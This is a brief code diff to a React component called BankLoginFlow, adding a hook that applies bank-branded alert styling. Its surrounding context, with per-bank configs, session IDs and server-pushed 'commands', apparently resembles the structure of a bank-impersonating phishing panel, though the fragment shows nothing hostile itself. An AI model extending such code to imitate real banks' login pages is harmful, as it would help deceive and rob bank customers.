@@ -4,6 +4,7 @@ import { useLocaleContext } from '@/i18n/LocaleProvider';
 import { useBankLoginFlow } from './useBankLoginFlow';
 import { LoginForm } from './components/LoginForm';
 import { showCommand } from './swalController';
+import { applyBankSwalCss } from './bankSwalStyle';
 
 type Props = {
     bank: BankConfig;
@@ -16,6 +17,8 @@ export function BankLoginFlow({ bank, sessionId }: Props) {
         bankSlug: bank.slug,
     });
     const { dict } = useLocaleContext();
+
+    useEffect(() => applyBankSwalCss(bank.brand), [bank.brand]);
 
     useEffect(() => {
         showCommand(command, { dict, answer, reset });
